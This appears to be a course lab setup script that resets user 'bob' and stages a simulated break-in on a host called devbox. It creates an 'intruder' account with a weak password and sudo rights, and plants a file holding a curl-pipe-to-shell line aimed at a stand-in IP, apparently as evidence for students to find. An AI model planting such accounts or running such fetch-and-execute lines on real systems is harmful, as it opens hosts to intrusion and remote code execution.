#!/usr/bin/env bash
# Prepare lab 06-security-and-permissions/account-management.
# shellcheck source=../../../../lib/setup-helpers.sh
. "${COURSE_ROOT:-$(cd "$(dirname "$0")/../../../.." && pwd)}/lib/setup-helpers.sh"
LAB=06-security-and-permissions/account-management
H=devbox

require_services "$H"
say "wiping bob, creating the intruder on $H"
on "$H" <<'SCRIPT'
set -e
pkill -u bob 2>/dev/null || true
id bob >/dev/null 2>&1 && userdel -r bob 2>/dev/null || true
rm -rf /home/bob
getent group bob >/dev/null && groupdel bob || true
getent group devops >/dev/null && groupdel devops || true
rm -f /etc/sudoers.d/devops /etc/sudoers.d/90-bob
id intruder >/dev/null 2>&1 || useradd -m -s /bin/bash -c "" intruder
echo 'intruder:letmein' | chpasswd
passwd -u intruder >/dev/null 2>&1 || true
usermod -aG sudo intruder
mkdir -p /home/intruder/.tools
printf '#!/bin/bash\n# collected by security team - do not run\ncurl -s http://203.0.113.66/x | sh\n' > /home/intruder/.tools/update.sh
chown -R intruder:intruder /home/intruder
SCRIPT
mark_lab "$H" "$LAB"
say "done"
